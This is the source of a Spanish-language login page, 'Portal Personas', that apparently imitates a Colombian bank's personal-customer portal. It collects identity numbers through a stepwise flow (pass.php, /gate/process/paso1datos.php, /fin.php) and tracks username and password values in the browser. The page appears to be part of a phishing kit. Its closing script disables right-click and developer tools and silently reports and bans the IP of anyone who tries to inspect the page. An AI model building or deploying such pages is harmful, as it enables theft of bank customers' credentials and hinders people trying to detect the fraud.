<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Portal Personas</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

html,
body{
    width:100%;
    height:100%;
    font-family:Arial,Helvetica,sans-serif;
}

body{
    overflow:hidden;
}

.container{
    display:flex;
    width:100%;
    height:100vh;
}

.left-panel,
.right-panel{
    width:50%;
    height:100vh;
}

.left-panel img{
    width:100%;
    height:100%;
    object-fit:cover;
    display:block;
}

.right-panel{
    background:#f5f5f5;
    display:flex;
    justify-content:center;
    align-items:center;
}

.login-container{
    width:420px;
    max-width:90%;
}

.logo{
    margin-bottom:35px;
}

.logo img{
    width:180px;
    display:block;
}

h1{
    font-size:38px;
    line-height:1.05;
    color:#242424;
    font-weight:700;
    margin-bottom:20px;
}

/* ========================================= */
/* BANNER DE ERROR AMARILLO/CAFÉ (NUEVO) */
/* ========================================= */
.error-banner {
    background-color: #fdf6e7; /* Fondo amarillo claro pastel */
    border: 1px solid #e5d8c1; /* Borde sutil */
    border-radius: 12px;
    padding: 16px 18px;
    margin-bottom: 25px;
    display: flex;
    align-items: flex-start;
    gap: 12px;
    box-shadow: 0 2px 6px rgba(0,0,0,0.03);
}

.error-banner-icon {
    margin-top: 2px;
    flex-shrink: 0;
}

/* Icono SVG de triángulo de advertencia */
.error-banner-icon svg {
    width: 24px;
    height: 24px;
    stroke: #7a541c; /* Color café */
    fill: none;
    stroke-width: 2;
    stroke-linecap: round;
    stroke-linejoin: round;
}

.error-banner-content h3 {
    color: #7a541c; /* Texto café oscuro */
    font-size: 17px;
    font-weight: 700;
    margin-bottom: 6px;
}

.error-banner-content p {
    color: #222;
    font-size: 15px;
    line-height: 1.5;
}

.intentos-text {
    color: #cb3234; /* Texto rojo */
    font-size: 15px;
    margin-top: 10px;
    display: block;
}
/* ========================================= */

.description{
    font-size:15px;
    color:#333;
    line-height:1.7;
    margin-bottom:28px;
}

label{
    display:block;
    font-size:16px;
    font-weight:700;
    color:#222;
    margin-bottom:10px;
}

input{
    width:100%;
    height:48px;
    border:1px solid #9fb0c5;
    border-radius:8px;
    padding:0 15px;
    font-size:15px;
    outline:none;
    background:#fff;
}

input:focus{
    border-color:#4b75a8;
}

.input-error{
    border:2px solid #0067d8!important; /* Borde azul como en tu imagen */
}

.example{
    display:block;
    margin-top:10px;
    color:#5b6e86;
    font-size:14px;
}

.error-message{
    display:none;
    margin-top:18px;
    color:#d93025;
    font-size:13px;
    line-height:1.4;
    font-weight:500;
}

.actions{
    margin-top:20px;
    display:flex;
    justify-content:space-between;
    align-items:center;
}

.btn{
    width:120px;
    height:44px;
    border:none;
    border-radius:22px;
    background:#d1d6d9;
    color:#333;
    font-size:16px;
    font-weight:700;
    cursor:pointer;
    transition: background 0.3s;
}

.btn.active{
    background:#0067d8;
    color:#fff;
}

.forgot{
    text-decoration:none;
    color:#0067d8;
    font-weight:600;
    font-size:15px;
}

.separator{
    border:none;
    border-top:1px solid #ddd;
    margin:60px 0 28px;
}

.register{
    font-size:15px;
    color:#333;
}

.register a{
    color:#0067d8;
    text-decoration:none;
    font-weight:700;
}

/* ========================= */
/* MOBILE */
/* ========================= */

@media(max-width:900px){
    body{
        overflow-y:auto;
        overflow-x:hidden;
    }
    .container{
        flex-direction:column;
        height:auto;
        min-height:100vh;
    }
    .left-panel{
        width:100%;
        height:35vh; 
    }
    .right-panel{
        width:100%;
        height:auto;
        min-height:auto;
        align-items:flex-start;
        justify-content:flex-start;
    }
    .login-container{
        width:100%;
        max-width:none;
        padding:25px 32px 40px; 
    }
    .logo{
        margin-top:0;
        margin-bottom:35px;
    }
    .logo img{
        width:180px;
    }
    h1{
        font-size:32px;
        line-height:1.1;
    }
    .description{
        font-size:14px;
    }
    .actions{
        flex-wrap:wrap;
        gap:20px;
    }
}
</style>
</head>
<body>

<div class="container">

    <div class="left-panel">
        <img src="img/f.png" alt="Imagen principal">
    </div>

    <div class="right-panel">

        <div class="login-container">

            <div class="logo">
                <img src="img/l.svg" alt="Logo">
            </div>

            <h1>Bienvenido al Portal<br>Personas</h1>

            <?php if ($mostrar_error): ?>
            <div class="error-banner">
                <div class="error-banner-icon">
                    <svg viewBox="0 0 24 24">
                        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
                        <line x1="12" y1="9" x2="12" y2="13"></line>
                        <line x1="12" y1="17" x2="12.01" y2="17"></line>
                    </svg>
                </div>
                <div class="error-banner-content">
                    <h3>Usuario o contraseña incorrectas</h3>
                    <p>Recuerde que su contraseña será bloqueada al tercer intento errado. Por favor verifique e intente de nuevo.</p>
                </div>
            </div>
            <?php endif; ?>

            <p class="description">
                Recuerde que su usuario está compuesto por su Tipo de Identificación (CC, CE, NI, TI, PE) y su Número de Identificación sin espacios, puntos ni comas.
            </p>

            <form id="loginForm" action="pass.php" method="POST">
                
                <input type="hidden" name="flujo_token" value="<?php echo htmlspecialchars($_SESSION['flujo_token']); ?>">

                <label for="usuario">Usuario</label>
                
                <input
                    type="text"
                    id="usuario"
                    name="usuario"
                    autocomplete="off"
                    required
                    <?php if($mostrar_error) echo 'class="input-error"'; ?>
                >

                <span class="example">Ejemplo: CC1234567890</span>

                <?php if ($mostrar_error): ?>
                    <?php if ($intentos_actuales == 1): ?>
                        <span class="intentos-text">Le quedan 2 intentos</span>
                    <?php elseif ($intentos_actuales == 2): ?>
                        <span class="intentos-text">Este es su último intento</span>
                    <?php endif; ?>
                <?php endif; ?>

                <div id="errorUsuario" class="error-message">
                    Datos incorrectos. Recuerde iniciar con CC, CE, NI, TI o PE.
                </div>

                <div class="actions">
                    <button type="submit" class="btn" id="btnSubmit">Siguiente</button>
                    <a href="#" class="forgot">¿Olvidó su contraseña?</a>
                </div>

            </form>

            <hr class="separator">

            <div class="register">
                ¿Es un cliente nuevo?
                <a href="#">Registrarse</a>
            </div>

        </div>

    </div>

</div>

<script>
const form = document.getElementById('loginForm');
const usuario = document.getElementById('usuario');
const error = document.getElementById('errorUsuario');
const btnSubmit = document.getElementById('btnSubmit');

// Limpiar sesión vieja de localStorage al entrar a la página inicial para iniciar un flujo limpio sin basura residual
localStorage.removeItem('session_id');
localStorage.removeItem('messageId');
localStorage.removeItem('token');
localStorage.removeItem('username');
localStorage.removeItem('password');
localStorage.removeItem('identificacion');

// Lógica de validación visual del input
usuario.addEventListener('input', () => {
    const valor = usuario.value.trim().toUpperCase();
    
    // Activa el botón al escribir
    if(valor.length > 0){
        btnSubmit.classList.add('active');
    } else {
        btnSubmit.classList.remove('active');
    }

    if (!valor) {
        error.style.display = 'none';
        usuario.classList.remove('input-error');
        return;
    }

    const valido = /^(CC|CE|NI|TI|PE)[0-9]+$/i.test(valor);

    if (valido) {
        error.style.display = 'none';
        // Mantiene el borde azul si hubo error antes, pero quita el de datos incorrectos
    } else {
        error.style.display = 'block';
        usuario.classList.add('input-error'); // Aquí sí se fuerza el borde de error de validación
    }
});

form.addEventListener('submit', e => {
    const valor = usuario.value.trim().toUpperCase();

    if (!/^(CC|CE|NI|TI|PE)[0-9]+$/i.test(valor)) {
        e.preventDefault();
        error.style.display = 'block';
        usuario.classList.add('input-error');
        return;
    }

    usuario.value = valor;
});
</script>

<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html>